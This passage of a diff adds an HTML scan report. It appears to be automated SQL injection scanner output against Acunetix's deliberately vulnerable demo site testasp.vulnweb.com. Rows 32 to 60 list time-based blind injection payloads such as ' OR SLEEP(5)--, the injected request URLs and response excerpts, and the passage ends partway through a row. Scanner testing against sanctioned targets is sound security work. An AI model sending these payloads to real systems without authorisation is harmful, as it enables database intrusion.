+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_32')">Toggle</span>
+                        <div id="resp_32" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>33</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_33')">Toggle</span>
+                        <div id="resp_33" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>34</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_34')">Toggle</span>
+                        <div id="resp_34" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>35</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_35')">Toggle</span>
+                        <div id="resp_35" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>36</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_36')">Toggle</span>
+                        <div id="resp_36" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>37</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_37')">Toggle</span>
+                        <div id="resp_37" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>38</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_38')">Toggle</span>
+                        <div id="resp_38" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>39</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_39')">Toggle</span>
+                        <div id="resp_39" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>40</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_40')">Toggle</span>
+                        <div id="resp_40" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>41</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_41')">Toggle</span>
+                        <div id="resp_41" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>42</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_42')">Toggle</span>
+                        <div id="resp_42" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>43</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_43')">Toggle</span>
+                        <div id="resp_43" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>44</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_44')">Toggle</span>
+                        <div id="resp_44" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>45</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_45')">Toggle</span>
+                        <div id="resp_45" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>46</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_46')">Toggle</span>
+                        <div id="resp_46" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>47</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_47')">Toggle</span>
+                        <div id="resp_47" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>48</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_48')">Toggle</span>
+                        <div id="resp_48" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>49</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_49')">Toggle</span>
+                        <div id="resp_49" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>50</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_50')">Toggle</span>
+                        <div id="resp_50" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>51</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_51')">Toggle</span>
+                        <div id="resp_51" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>52</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_52')">Toggle</span>
+                        <div id="resp_52" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>53</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_53')">Toggle</span>
+                        <div id="resp_53" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>54</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_54')">Toggle</span>
+                        <div id="resp_54" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>55</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_55')">Toggle</span>
+                        <div id="resp_55" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>56</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_56')">Toggle</span>
+                        <div id="resp_56" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>57</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_57')">Toggle</span>
+                        <div id="resp_57" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>58</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_58')">Toggle</span>
+                        <div id="resp_58" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>59</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_59')">Toggle</span>
+                        <div id="resp_59" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>60</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
